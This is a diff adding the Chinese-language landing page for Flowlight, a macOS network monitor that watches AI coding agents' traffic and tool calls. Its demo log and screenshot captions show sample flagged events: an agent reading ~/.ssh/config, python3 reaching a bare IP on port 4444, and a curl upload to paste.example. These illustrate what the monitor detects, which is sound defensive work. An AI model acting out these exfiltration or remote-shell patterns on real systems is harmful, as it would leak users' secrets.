+          alt="Codex 的 MCP 服务器标签页：一个标为“经由提供方”的 sentry 服务器，以及它的 URL、设为“从不”的审批、允许的工具和它提供的工具"></div>
+          <figcaption><b>连线路上看不到的那些也算。</b>当代理请求提供方去连接某个 MCP 服务器时，那段流量根本不会经过你的 Mac。
+            但它的请求会，所以这个服务器、它的 URL、它的审批设置和它的工具依然会出现。</figcaption></figure>
+      </div>
+      <div class="privacy" style="margin-top:32px">
+        <div><strong>工具调用与结果</strong><p>支持 Anthropic、OpenAI、Gemini 和 MCP。每次调用都带上它的命令、输出或错误，以及这个工具发出的请求。</p></div>
+        <div><strong>模型与 token</strong><p>哪个模型作答、调用了多少次，以及每个代理的输入、输出和由缓存提供的 token 数。</p></div>
+        <div><strong>可读的请求体</strong><p>JSON 按原始顺序呈现为可折叠的树，流式响应逐个事件呈现，还有头部和原始视图。</p></div>
+        <div><strong>明确受你控制</strong><p>检查默认只针对 AI 代理。Flowlight 会把内置的 Apple 服务和密码管理器名单排除在外，在存储前抹去凭据标头，并提供一个操作来移除证书和已记录的数据。</p></div>
+      </div>
+    </div>
+  </section>
+
+<section class="band" id="roadmap">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">接下来</p>
+        <h2>正在路上的东西</h2>
+        <p class="lede">Flowlight 今天已经能看见、能解释、能拒绝。剩下的部分会按这个顺序做。</p>
+      </div>
+      <div class="privacy">
+        <div><strong>先 Linux，再 Windows</strong><p>分析内核是可移植的 Swift，捕获不是。先出一个带本地网页界面的 Linux 守护进程，基于 eBPF 而非 macOS API。</p></div>
+      </div>
+    </div>
+  </section>
+
+<section class="band" id="privacy">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">隐私</p>
+        <h2>一个不用你盯着的监控工具</h2>
+      </div>
+      <div class="privacy">
+        <div><strong>只留在你的 Mac 上</strong><p>一个本地 SQLite 文件。没有账号，不做云同步，不收遥测。</p></div>
+        <div><strong>默认只看元数据</strong><p>主机名、端口和字节数。解密 HTTPS 是另一个要你自己打开的模式，而且同样只在你的 Mac 上。</p></div>
+        <div><strong>在内核里就筛掉</strong><p>捕获只放行 DNS 应答和 TLS ClientHello。其余一切在 Flowlight 看到之前就被丢掉了。</p></div>
+        <div><strong>查询由你掌控</strong><p>要查出某个地址归谁所有，只会把没有主机名的公网 IP 发给 Team Cymru，一键即可关闭。每日更新检查只向 GitHub 询问最新版本，同样可以关掉。</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="band" id="agent-detail" aria-label="代理详情截图">
+    <div class="wrap">
+      <figure class="detail-shot"><div class="frame"><img src="../assets/screenshots/agent-detail.png?v=d9dd8e0f" width="1600" height="622" loading="lazy"
+        alt="Flowlight 里 Claude Code 的详情：带调用次数和一次失败的工具与 MCP 服务器、一个允许列表，以及工具调用标签页，里面列出一次失败的 git push、一次 curl 向 paste.example 的上传及其响应和请求、npm install、一个 GitHub issue、一次文档搜索和一次文件读取，每项都带结果"></div>
+        <figcaption><b>一个代理，每一次工具调用。</b>Claude Code 启动的 git、curl 和 MCP 服务器产生的流量都算作 Claude Code 的。
+          打开 HTTPS 检查后，<em>工具调用</em>标签页会显示模型要求了什么、返回了什么，以及每个工具发出的请求：
+          curl 向 paste.example 的那次上传，以及失败的那次 git push。</figcaption></figure>
+    </div>
+  </section>
+
+  <section class="band" aria-label="更多截图">
+    <div class="wrap screens">
+      <figure><div class="frame"><img src="../assets/screenshots/reports.png?v=dafc9b18" width="1600" height="1075" loading="lazy"
+        alt="报告视图，含每小时接收与发送的柱状图，以及应用、目标和协议的环形图"></div>
+        <figcaption><b>报告。</b>从秒到年的缩放、三种分组方式，几百个应用也读得清的图表。</figcaption></figure>
+      <figure><div class="frame"><img src="../assets/screenshots/alerts.png?v=b61d6fd7" width="1600" height="1075" loading="lazy"
+        alt="警报视图，列出代理外泄、邮件、FTP、你离开时活动和流量突增等警报"></div>
+        <figcaption><b>警报。</b>每一条都点明应用、目标和触发它的那个数字。</figcaption></figure>
+    </div>
+  </section>
+
+  <section class="band" id="install">
+    <div class="wrap install">
+      <div class="section-head" style="margin:0">
+        <p class="eyebrow">安装</p>
+        <h2>一分钟内跑起来</h2>
+        <ol class="steps" style="margin-top:16px">
+          <li><div><strong>下载 Flowlight.dmg</strong><p>打开它，把 Flowlight 拖进“应用程序”。每个版本还附带一个 <a href="https://github.com/xinbetween/flowlight/releases/latest">.pkg 安装包</a>。发布版本都用 Developer ID 证书签名，并经过 Apple 公证。</p></div></li>
+          <li><div><strong>启动它</strong><p>流量一秒内就会出现，实时 ↓↑ 速率就待在菜单栏里。</p></div></li>
+          <li><div><strong>给流量配上名字</strong><p>同意一次性设置（输一次你的密码），Flowlight 就能读到主机名。</p></div></li>
+        </ol>
+      </div>
+      <div style="display:grid;gap:14px">
+        <p style="color:var(--muted)">想自己编译，或者先用示例数据逛一圈？</p>
+<pre><span class="c"># build from source (Xcode 16+, no Apple account needed)</span>
+brew install xcodegen
+git clone https://github.com/xinbetween/flowlight.git
+cd flowlight &amp;&amp; xcodegen generate
+scripts/build-local.sh
+
+<span class="c"># explore with 90 days of synthetic traffic</span>
+open Flowlight.app --args -FLDemo YES</pre>
+      </div>
+    </div>
+  </section>
+
+  <section class="band" id="faq">
+    <div class="wrap">
+      <div class="section-head"><p class="eyebrow">常见问题</p><h2>问答</h2></div>
+      <div class="faq">
+        <details><summary>Flowlight 会拦截流量吗？</summary>
+          <p>默认情况下它只观察并提醒，包括代理离开允许列表的时候。它也可以拒绝那些连接，
+            但仅限你为之开启了这项设置的代理，而且必须装有网络扩展引擎——采样器只能观察。
+            本地流量、DNS、Apple 服务以及 Flowlight 自己的连接永远不会被拒绝。</p></details>
+        <details><summary>它能读我的 HTTPS 流量吗？</summary>
+          <p>默认不能。它读取客户端建立连接时请求的主机名（TLS SNI），以及把域名映射到地址的 DNS 应答，
+            内容始终保持加密。如果你想看到全貌，<strong>HTTPS 检查</strong>是一个独立的、需自行开启的模式：
+            Flowlight 会成为带有自己证书颁发机构的本地代理，并解密你交给它转发的应用（默认只有 AI 代理），
+            包括模型要求代理执行的每一次工具调用。固定了证书的应用可能拒绝它。
+            Flowlight 会把内置的 Apple 服务和密码管理器名单排除在检查之外。</p></details>
+        <details><summary>它和 Little Snitch 或 LuLu 有什么不同？</summary>
+          <p>那些是防火墙，会请你逐个放行连接。Flowlight 是分析工具：任意粒度的历史、
+            异常基线，以及为 AI 代理而做的规则。两者并用效果很好。</p></details>
+        <details><summary>它为什么要我的密码？</summary>
+          <p>macOS 只允许管理员读取网络数据包。一次性设置会给你的账户读取权限，
+            和 Wireshark 的做法一样。你随时可以在“捕获”界面里把它移除。</p></details>
+        <details><summary>它能分辨是哪个 MCP 服务器或工具发出的请求吗？</summary>
+          <p>能，到进程这一层。Flowlight 会沿着每个进程追回启动它的那个代理，所以 shell 工具的
+            curl 或某个 MCP 服务器的连接都会归到那个代理名下；MCP 服务器的名字取自 Claude Code、Claude
+            Desktop、Cursor、Windsurf、VS Code、Codex、Zed 和 Gemini CLI 的配置。它无法看出在一个
+            长期运行的服务器里，究竟是哪一次工具调用开了连接。</p></details>
+        <details><summary>允许列表会拦截流量吗？</summary>
+          <p>允许列表默认只报告违规。网络扩展处于活动状态时，你可以为某个代理启用强制执行，未列出的目标就会被拒绝。nettop 采样器可以报告违规，但无法阻止连接。</p></details>
+        <details><summary>它能识别哪些代理？</summary>
+          <p>Claude Code、Codex、Cursor、Windsurf、GitHub Copilot、Gemini CLI、Aider、Goose、OpenCode、Ollama、LM Studio、
+            ChatGPT、Claude、Zed、Perplexity 和 ZCode，再加上任何调用已知 LLM API 的非浏览器进程。
+            新增一个只需一行的拉取请求。</p></details>
+        <details><summary>它怎么更新？</summary>
+          <p>Flowlight 每天向 GitHub 查询一次最新版本。有新版本时，它会显示更新说明，并可以下载
+            磁盘映像、用公布的 SHA-256 校验，然后打开它。你可以在“设置”里关掉这项检查。</p></details>
+        <details><summary>它真的免费吗？</summary>
+          <p>是。它是 GPL-3.0 下的自由软件：没有付费版，不收集数据。</p></details>
+      </div>
+    </div>
+  </section>
+
+  
+  <section class="final">
+    <div class="wrap">
+      <h2>知道什么离开了你的 Mac。</h2>
+      <p class="lede">面向 macOS 15 及更高版本的自由软件。</p>
+      <div class="cta">
+        <a class="btn btn-primary" href="https://github.com/xinbetween/flowlight/releases/latest/download/Flowlight.dmg">下载 macOS 版</a>
+        <a class="btn btn-ghost" href="https://github.com/xinbetween/flowlight">查看源代码</a>
+        <p class="brew"><code>brew install --cask xinbetween/tap/flowlight</code><button type="button" class="copy" data-copy="brew install --cask xinbetween/tap/flowlight">拷贝</button></p>
+      </div>
+    </div>
+  </section>
+
+</main>
+<script>
+  // Stream new lines into the connection log. The full log is readable at rest.
+  //
+  // The feed is a tour of what Flowlight does now: traffic and alerts, but also a refusal, a guardrail taking a
+  // tool away before the model is offered it, a mocked answer, peer-to-peer Wi-Fi, a device arriving, and a tool
+  // call tied to the request it caused.
+  (function () {
+    var log = document.getElementById("log");
+    if (!log || window.matchMedia("(prefers-reduced-motion: reduce)").matches) return;
+    var feed = [
+      { app: "Chrome", dest: "github.com", proto: "https:443", dir: "down", bytes: "↓ 640 KB" },
+      { app: "codex", dest: "api.openai.com", proto: "https:443", dir: "up", bytes: "↑ 900 KB" },
+      { kind: "tool", note: "↳ Read: ~/.ssh/config — 没有网络请求" },
+      { app: "claude", dest: "registry.npmjs.org", proto: "https:443", dir: "down", bytes: "↓ 300 KB" },
+      { app: "claude › node", dest: "registry.npmjs.org", proto: "https:443", dir: "up", bytes: "已拒绝",
+        kind: "block", note: "⛔ 规则“18:00 之后不安装软件包”" },
+      { app: "zoom.us", dest: "zoom.us", proto: "zoom-media:8801", dir: "down", bytes: "↓ 6.1 MB" },
+      { kind: "device", note: "● 已连接 Backup Drive · USB · 2 TB" },
+      { app: "python3", dest: "203.0.113.45", proto: "tcp:4444", dir: "up", bytes: "↑ 40 KB",
+        kind: "flag", note: "⚠ 代理联系了一台无名主机" },
+      { app: "rapportd", dest: "连续互通 · 附近的设备", proto: "llw0", dir: "down", bytes: "↓ 310 KB", kind: "p2p" },
+      { app: "claude", dest: "mcp.github.com", proto: "tools/call", dir: "down", bytes: "isError",
+        kind: "guard", note: "🛡 护栏：已拒绝 create_issue，并告知模型原因" },
+      { app: "Safari", dest: "en.wikipedia.org", proto: "https:443", dir: "down", bytes: "↓ 250 KB" },
+      { app: "claude", dest: "github.com", proto: "ssh:22", dir: "up", bytes: "↑ 30 KB",
+        kind: "flag", note: "⚠ 代理打开了一个 SSH 会话" },
+      { app: "Flowlight", dest: "127.0.0.1", proto: "ollama:11434", dir: "up", bytes: "↑ 2 KB",
+        kind: "ask", note: "≡ 提问：在这台 Mac 上作答，什么都没发出" },
+      { app: "sharingd", dest: "AirDrop · 附近的设备", proto: "awdl0", dir: "up", bytes: "↑ 820 MB", kind: "p2p" },
+      { app: "iCloud", dest: "p45-content.icloud.com", proto: "https:443", dir: "up", bytes: "↑ 700 KB" },
+      { app: "Cursor", dest: "api2.cursor.sh", proto: "POST /v1/chat", dir: "down", bytes: "503",
+        kind: "mock", note: "✎ 由 Flowlight 应答，从未发往上游" },
+    ];
+    var i = 0;
+    function line(r) {
+      var li = document.createElement("li");
+      li.className = ["enter", r.kind || ""].join(" ").trim();
+      // A row with no destination is an event rather than a connection: a tool call, a device arriving.
+      if (!r.dest) {
+        li.innerHTML = '<span class="app"></span><span class="note"></span>';
+        li.querySelector(".note").textContent = r.note;
+        return li;
+      }
+      li.innerHTML = '<span class="app"></span><span class="dest"><b></b> · <i></i></span>' +
+        '<span class="bytes ' + (r.dir || "") + '"></span>' + (r.note ? '<span class="note"></span>' : "");
+      li.querySelector(".app").textContent = r.app;
+      li.querySelector(".dest b").textContent = r.dest;
+      var proto = li.querySelector(".dest i");
+      proto.textContent = r.proto;
+      proto.style.fontStyle = "normal";
+      li.querySelector(".bytes").textContent = r.bytes;
+      if (r.note) li.querySelector(".note").textContent = r.note;
+      return li;
+    }
+    setInterval(function () {
+      log.insertBefore(line(feed[i++ % feed.length]), log.firstChild);
+      while (log.children.length > 12) log.removeChild(log.lastChild);
+    }, 1900);
+  })();
+</script>
+<footer class="site-footer">
+  <div class="wrap">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a class="brand" href="../zh-Hans/"><img src="../assets/icon.png" alt="">Flowlight</a>
+        <p>面向 macOS 的应用级网络监控，尤其看得清 AI 代理。</p>
+      </div>
+      <div><h4>产品</h4><ul>
+        <li><a href="https://github.com/xinbetween/flowlight/releases/latest/download/Flowlight.dmg">下载 macOS 版</a></li>
+        <li><a href="../zh-Hans/docs/#install">用 Homebrew 安装</a></li>
+        <li><a href="../releases/">更新说明</a></li>
+        <li><a href="../zh-Hans/docs/">文档</a></li>
+      </ul></div>
+      <div><h4>项目</h4><ul>
+        <li><a href="https://github.com/xinbetween/flowlight">源代码</a></li>
+        <li><a href="https://github.com/xinbetween/flowlight/blob/main/CONTRIBUTING.md">参与贡献</a></li>
+        <li><a href="https://github.com/xinbetween/flowlight/issues">反馈问题</a></li>
+      </ul></div>
+      <div><h4>信任</h4><ul>
+        <li><a href="../zh-Hans/privacy/">隐私</a></li>
+        <li><a href="https://github.com/xinbetween/flowlight/blob/main/LICENSE">许可证（GPL-3.0）</a></li>
+        <li><a href="../zh-Hans/about/">关于</a></li>
+      </ul></div>
+      <div><h4>给 AI 代理</h4><ul>
+        <li><a href="../llms.txt">llms.txt</a></li>
+        <li><a href="../llms-full.txt">llms-full.txt</a></li>
+        <li><a href="../sitemap.xml">站点地图</a></li>
+      </ul></div>
+    </div>
+    <div class="legal">
+      <span>© 2026 Flowlight 贡献者。Flowlight 是自由软件，依 <a href="https://github.com/xinbetween/flowlight/blob/main/LICENSE">GNU General Public License v3.0</a> 发布。</span>
+      <span>版本 0.7.7 · 与 Apple 及本站提及的任何 AI 提供方均无关联。</span>
+    </div>
+  </div>
+</footer>
+<script>
+  // Copy buttons for the install command. Falls back to selecting the text when the clipboard isn't available.
+  document.querySelectorAll("button.copy").forEach(function (button) {
+    button.addEventListener("click", function () {
+      var done = function () {
+        button.textContent = "已拷贝";
+        button.setAttribute("data-copied", "");
+        setTimeout(function () { button.textContent = "拷贝"; button.removeAttribute("data-copied"); }, 1600);
+      };
+      var text = button.getAttribute("data-copy");
+      if (navigator.clipboard) { navigator.clipboard.writeText(text).then(done, select); } else { select(); }
+      function select() {
+        var range = document.createRange();
+        range.selectNodeContents(button.parentNode.querySelector("code"));
+        var selection = getSelection();
+        selection.removeAllRanges();
+        selection.addRange(range);
+      }
+    });
+  });
+
+  // The table of contents starts collapsed on a phone. It is marked open in the markup so that without
+  // JavaScript — or on a desktop, where the summary is hidden — it is simply a list.
+  (function () {
+    var sheet = document.querySelector(".toc-sheet");
+    if (sheet && matchMedia("(max-width: 900px)").matches) sheet.removeAttribute("open");
+  })();
+
+  // Sections reveal as they come into view — once each, never on the way back up, and never for anyone who has
+  // asked for less motion. Without IntersectionObserver nothing is hidden in the first place, so the page reads
+  // exactly the same.
+  (function () {
+    var reduced = matchMedia("(prefers-reduced-motion: reduce)");
+    if (reduced.matches || !("IntersectionObserver" in window)) return;
+    var targets = document.querySelectorAll("section.band > .wrap, .shot .wrap, .final .wrap");
+    if (!targets.length) return;
+    var observer = new IntersectionObserver(function (entries) {
+      entries.forEach(function (entry) {
+        if (!entry.isIntersecting) return;
+        entry.target.classList.add("shown");
+        observer.unobserve(entry.target);
+      });
+    }, { rootMargin: "0px 0px -8% 0px", threshold: 0.05 });
+    targets.forEach(function (target) {
+      target.classList.add("reveal");
+      observer.observe(target);
+    });
+  })();
+
+  // The language menu closes when the pointer goes elsewhere, the way a menu should.
+  (function () {
+    var menu = document.querySelector("details.lang");
+    if (!menu) return;
+    document.addEventListener("click", function (event) {
+      if (menu.open && !menu.contains(event.target)) menu.open = false;
+    });
+    document.addEventListener("keydown", function (event) {
+      if (event.key === "Escape" && menu.open) { menu.open = false; menu.querySelector("summary").focus(); }
+    });
+  })();
+</script>
+
+</body>
+</html>
